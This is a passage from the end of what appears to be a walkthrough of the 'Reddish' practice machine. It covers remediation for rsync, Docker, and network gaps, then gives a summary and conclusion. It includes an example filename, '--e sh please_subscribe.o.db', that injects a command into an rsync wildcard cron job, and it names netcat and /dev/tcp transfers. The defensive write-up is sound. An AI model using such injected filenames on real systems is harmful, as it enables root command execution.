</code></pre><ul><li>Create <code>/etc/rsyncd.secrets</code> with <code>backup_user:strong_password</code> and set permissions: <code>chmod 600 /etc/rsyncd.secrets</code>.</li></ul></li><li>Restrict rsync modules to read-only or specific directories:<pre tabindex=0><code class=language-conf data-lang=conf>[src]
path = /src/etc/cron.d/
read only = yes
</code></pre></li><li>Use a firewall to limit rsync access: <code>iptables -A INPUT -p tcp --dport 873 -s 172.20.0.0/24 -j ACCEPT; iptables -A INPUT -p tcp --dport 873 -j DROP</code>.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If rsync is part of a custom application, enforce user authentication and validate file uploads to prevent arbitrary writes.</li></ul></li></ul></li><li><p><strong>Gap 2: Cron Job Executing Rsync with Wildcard</strong></p><ul><li><strong>Description</strong>: The cron job (<code>/backup/backup.sh</code>) uses <code>rsync</code> with a wildcard (<code>*.o.db</code>), allowing attackers to inject commands via specially crafted filenames (e.g., <code>--e sh please_subscribe.o.db</code>).</li><li><strong>Impact</strong>: Leads to arbitrary command execution as root.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Modify the cron job to avoid wildcards and explicitly list files to sync:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rsync -av /specific/file.o.db rsync://backup:873/src/etc/cron.d/
</span></span></code></pre></div></li><li>Run the cron job as a non-root user with minimal permissions.</li><li>Validate filenames in the rsync destination directory before execution:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#66d9ef>for</span> file in /src/etc/cron.d/*.o.db; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$file<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span>~ ^<span style=color:#f92672>[</span>a-zA-Z0-9_<span style=color:#ae81ff>\.</span><span style=color:#f92672>]</span>+$ <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;Invalid filename: </span>$file<span style=color:#e6db74>&#34;</span> &gt;&amp;<span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># Process file</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div></li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If rsync is scripted, implement strict filename validation to reject files containing special characters like <code>--</code>.</li></ul></li></ul></li></ul><hr><h3 id=5-docker-containers>5. Docker Containers<a href=#5-docker-containers class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: Overprivileged Containers</strong></p><ul><li><strong>Description</strong>: Docker containers (Node-RED, web server, backup server) run with excessive privileges, allowing access to sensitive files (e.g., <code>/etc/shadow</code>) and enabling privilege escalation.</li><li><strong>Impact</strong>: Attackers can escalate to root within containers or access host resources.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Run containers with least privilege using Docker&rsquo;s security options:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run --user 1000:1000 --cap-drop<span style=color:#f92672>=</span>ALL --cap-add<span style=color:#f92672>=</span>NET_BIND_SERVICE node-red
</span></span></code></pre></div></li><li>Use a non-root user inside containers and avoid mounting sensitive host directories.</li><li>Enable Docker&rsquo;s user namespace mapping to isolate container UIDs from the host.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If custom container images are used, ensure the Dockerfile specifies a non-root user:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=display:flex><span><span style=color:#66d9ef>USER</span> <span style=color:#e6db74>node-red</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div></li></ul></li></ul></li><li><p><strong>Gap 2: Exposed Network Interfaces</strong></p><ul><li><strong>Description</strong>: Containers expose internal network interfaces (e.g., 172.18.0.0/16, 172.19.0.0/16) without isolation, allowing lateral movement.</li><li><strong>Impact</strong>: Attackers can scan and pivot to other containers.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Use Docker&rsquo;s network isolation to place containers in separate networks:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker network create --driver bridge isolated_net
</span></span><span style=display:flex><span>docker run --network isolated_net node-red
</span></span></code></pre></div></li><li>Implement network policies to restrict inter-container communication:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker network create --internal internal_net
</span></span></code></pre></div></li><li>Use a firewall to block unauthorized access between containers: <code>iptables -A FORWARD -s 172.18.0.0/16 -d 172.19.0.0/16 -j DROP</code>.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If a custom application manages Docker, enforce network segmentation in the orchestration logic.</li></ul></li></ul></li><li><p><strong>Gap 3: Mounted Host Disks in Backup Container</strong></p><ul><li><strong>Description</strong>: The backup container mounts host disks (e.g., <code>/dev/sda1</code>), exposing sensitive files like <code>/root/root.txt</code>.</li><li><strong>Impact</strong>: Attackers with root in the container can access host files.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Avoid mounting host devices in containers:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run --device<span style=color:#f92672>=</span>none backup_image
</span></span></code></pre></div></li><li>If disk access is required, use read-only mounts:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run --device<span style=color:#f92672>=</span>/dev/sda1:ro backup_image
</span></span></code></pre></div></li><li>Restrict container access to specific filesystems using AppArmor or SELinux profiles.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If the backup application requires disk access, implement strict path validation to prevent access to sensitive directories like <code>/root</code>.</li></ul></li></ul></li></ul><hr><h3 id=6-general-network-configuration>6. General Network Configuration<a href=#6-general-network-configuration class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: Exposed Services Without Firewall</strong></p><ul><li><strong>Description</strong>: Services like Node-RED (1880), Redis (6379), and rsync (873) are accessible from external or internal networks without restrictions.</li><li><strong>Impact</strong>: Attackers can directly target these services for exploitation.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Implement host-based firewall rules to restrict access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>1880</span> -s 127.0.0.1 -j ACCEPT
</span></span><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>6379</span> -s 172.19.0.0/24 -j ACCEPT
</span></span><span style=display:flex><span>iptables -A INPUT -p tcp --dport <span style=color:#ae81ff>873</span> -s 172.20.0.0/24 -j ACCEPT
</span></span><span style=display:flex><span>iptables -A INPUT -j DROP
</span></span></code></pre></div></li><li>Use a reverse proxy (e.g., Nginx) to control access to web services and enforce authentication.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If services are part of a custom application, implement IP-based access controls within the application logic.</li></ul></li></ul></li><li><p><strong>Gap 2: Lack of Network Segmentation</strong></p><ul><li><strong>Description</strong>: Containers and the host share overlapping network namespaces (e.g., 172.18.0.0/16, 172.19.0.0/16, 172.20.0.0/16), allowing unrestricted communication.</li><li><strong>Impact</strong>: Facilitates lateral movement between containers.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Use Docker&rsquo;s bridge or overlay networks to segment containers:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker network create --subnet<span style=color:#f92672>=</span>172.18.0.0/24 node_red_net
</span></span><span style=display:flex><span>docker network create --subnet<span style=color:#f92672>=</span>172.19.0.0/24 web_net
</span></span></code></pre></div></li><li>Configure routing to allow only necessary traffic between networks.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If a custom orchestration tool is used, enforce strict network policies in the application logic.</li></ul></li></ul></li><li><p><strong>Gap 3: Insecure File Transfer Mechanisms</strong></p><ul><li><strong>Description</strong>: The use of <code>netcat</code> and <code>/dev/tcp</code> for file transfers lacks encryption and authentication.</li><li><strong>Impact</strong>: Attackers can intercept or manipulate transferred files.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Use secure file transfer protocols like SCP or SFTP:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp file user@host:/path
</span></span></code></pre></div></li><li>If <code>netcat</code> is required, use encryption (e.g., <code>openssl</code> for TLS):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>openssl s_server -quiet -key key.pem -cert cert.pem -port <span style=color:#ae81ff>8000</span>
</span></span></code></pre></div></li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>Implement secure file transfer libraries (e.g., <code>paramiko</code> in Python) in custom applications.</li></ul></li></ul></li></ul><hr><h3 id=summary-of-fixes>Summary of Fixes<a href=#summary-of-fixes class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Node-RED</strong>: Enable authentication, disable <code>exec</code> node, and obscure application identity.</li><li><strong>Web Server</strong>: Isolate shared directories, disable PHP execution or sanitize inputs.</li><li><strong>Redis</strong>: Require authentication, disable dangerous commands, and restrict access.</li><li><strong>Rsync</strong>: Enforce authentication, avoid wildcards in cron jobs, and validate filenames.</li><li><strong>Docker</strong>: Run containers with minimal privileges, isolate networks, and avoid mounting host disks.</li><li><strong>Network</strong>: Use firewalls, segment networks, and secure file transfers.</li></ul><p>Implementing these configuration and source code fixes will significantly enhance the security of the systems and services, preventing the exploitation techniques used in the &ldquo;Reddish&rdquo; scenario.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Reddish is an excellent machine that demonstrates the complexity of containerized environments and the advanced pivoting techniques required in modern penetration testing. It requires expertise in:</p><ul><li>Node-RED flow-based programming exploitation</li><li>Advanced network pivoting with tools like Chisel</li><li>Redis database manipulation and configuration abuse</li><li>Docker container security and inter-container communication</li><li>Rsync wildcard exploitation and cron job abuse</li><li>Multi-hop privilege escalation through containerized environments</li></ul><p>The machine emphasizes the importance of proper container security, network segmentation, service authentication, and the principle of least privilege across containerized infrastructures.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>